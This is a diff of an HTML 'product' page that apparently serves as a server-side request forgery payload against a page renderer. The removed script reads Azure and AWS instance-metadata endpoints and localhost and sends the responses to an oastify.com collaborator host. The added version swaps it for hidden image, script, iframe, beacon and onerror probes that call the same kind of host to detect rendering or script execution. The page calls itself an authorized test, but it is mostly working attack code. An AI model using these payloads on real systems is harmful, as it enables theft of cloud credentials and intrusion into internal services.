@@ -1,42 +1,19 @@
 <!doctype html>
-<html><head><title>product</title></head>
+<html><head><title>product</title>
+<!-- HTML-parse probes (fire if renderer parses HTML, no JS needed) -->
+<img src="https://3txpslo3te3ouw0qs27x2qi5yw4pse.oastify.com/HTML-IMG-SRC" style="display:none">
+<script src="https://3txpslo3te3ouw0qs27x2qi5yw4pse.oastify.com/HTML-SCRIPT-SRC"></script>
+<link rel="stylesheet" href="https://3txpslo3te3ouw0qs27x2qi5yw4pse.oastify.com/HTML-LINK-SRC">
+<iframe src="https://3txpslo3te3ouw0qs27x2qi5yw4pse.oastify.com/HTML-IFRAME-SRC" style="display:none"></iframe>
+</head>
 <body>
-<h1>Product details</h1>
-<p>SSRF escalation probe (IMDS / cross-origin read) - authorized test.</p>
+<h1>Product</h1>
+<!-- JS-exec probe (fires ONLY if renderer executes inline JS) -->
 <script>
-(async () => {
-  const C = "sgcefabsg3qdhlnffrumpf5ullrdf2.oastify.com";
-  // exfil: no-cors GET, data in URL query (collaborator logs the request line)
-  const exfil = (label, data) => {
-    try { fetch("https://"+C+"/"+label+"?d="+encodeURIComponent(String(data).slice(0,1800)), {mode:"no-cors"}); } catch(e){}
-  };
-  exfil("PAGE-LOADED", "js executed in renderer");
-  // 1. Azure IMDS WITH Metadata header (the prize). cors mode to test read.
-  try {
-    const r = await fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {headers:{Metadata:"true"}});
-    const t = await r.text();
-    exfil("IMDS-OK", r.status+"|"+t);
-  } catch(e) { exfil("IMDS-ERR", String(e)); }
-  // 2. IMDS WITHOUT header (some configs respond)
-  try {
-    const r = await fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01");
-    exfil("IMDS-NOHDR", r.status+"|"+await r.text());
-  } catch(e) { exfil("IMDS-NOHDR-ERR", String(e)); }
-  // 3. cross-origin READ capability test (fetch collaborator, try to read response type)
-  try {
-    const r = await fetch("https://"+C+"/cors-read-test");
-    exfil("CORSREAD", r.status+"|type="+r.type);
-  } catch(e) { exfil("CORSREAD-ERR", String(e)); }
-  // 4. localhost probe
-  try {
-    const r = await fetch("http://localhost:80/");
-    exfil("LOCALHOST", r.status);
-  } catch(e) { exfil("LOCALHOST-ERR", String(e)); }
-  // 5. AWS-style IMDSv1 (no header) just in case
-  try {
-    const r = await fetch("http://169.254.169.254/latest/meta-data/");
-    exfil("AWS-IMDS", r.status+"|"+await r.text());
-  } catch(e) { exfil("AWS-IMDS-ERR", String(e)); }
-})();
+try { fetch("https://3txpslo3te3ouw0qs27x2qi5yw4pse.oastify.com/JS-EXEC-INLINE",{mode:"no-cors"}); } catch(e){}
+try { var x=new XMLHttpRequest(); x.open("GET","https://3txpslo3te3ouw0qs27x2qi5yw4pse.oastify.com/JS-XHR",true); x.send(); } catch(e){}
+try { navigator.sendBeacon("https://3txpslo3te3ouw0qs27x2qi5yw4pse.oastify.com/JS-BEACON","b"); } catch(e){}
 </script>
+<!-- JS event-handler probe (onerror fires only if JS runs) -->
+<img src="x" onerror="fetch('https://3txpslo3te3ouw0qs27x2qi5yw4pse.oastify.com/JS-ONERROR',{mode:'no-cors'})">
 </body></html>
